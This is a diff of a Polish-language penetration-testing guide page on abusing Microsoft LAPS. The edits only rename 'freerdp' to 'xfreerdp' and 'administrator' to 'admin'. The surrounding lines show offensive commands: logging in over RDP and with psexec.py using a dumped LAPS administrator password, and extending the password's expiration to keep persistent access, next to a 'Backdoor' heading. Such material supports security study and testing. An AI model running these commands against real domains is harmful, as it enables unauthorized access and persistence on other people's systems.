@@ -109,7 +109,7 @@ To będzie zrzut wszystkich haseł, które użytkownik może odczytać, co pozwo
 
 ## ** Używanie hasła LAPS **
 ```
-freerdp /v:192.168.1.1:3389  /u:Administrator
+xfreerdp /v:192.168.1.1:3389  /u:Administrator
 Password: 2Z@Ae)7!{9#Cq
 
 python psexec.py Administrator@web.example.com
@@ -129,7 +129,7 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-Hasło nadal zostanie zresetowane, jeśli **administrator** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w LAPS GPO jest włączona opcja **Nie pozwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę**.
+Hasło nadal zostanie zresetowane, jeśli **admin** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli w LAPS GPO jest włączona opcja **Nie pozwalaj na czas wygaśnięcia hasła dłuższy niż wymagany przez politykę**.
 {% endhint %}
 
 ### Backdoor
